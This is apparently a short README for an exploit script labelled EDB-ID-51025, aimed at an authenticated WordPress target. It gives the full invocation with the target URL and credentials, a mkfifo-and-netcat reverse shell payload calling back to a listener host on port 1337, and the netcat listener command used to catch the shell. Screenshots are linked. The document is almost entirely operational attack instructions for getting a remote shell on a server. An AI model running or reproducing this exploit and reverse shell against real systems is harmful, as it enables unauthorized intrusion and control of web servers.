# EDB-ID-51025


Usages:
- `python3 EDB-ID-51025.py -d http://192.168.228.143 -u wordpress -p wordpress -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.228.128 1337 >/tmp/f"`


Steps: For getting Shell
- nc -nvlp 1337

![image](https://user-images.githubusercontent.com/44284877/228901044-d417ea58-6a99-4012-93c4-a0926cde7c7f.png)

- `python3 EDB-ID-51025.py -d http://192.168.228.143 -u wordpress -p wordpress -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.228.128 1337 >/tmp/f"`

![image](https://user-images.githubusercontent.com/44284877/228901183-89953c82-b53b-4345-8017-468c99e250e1.png)


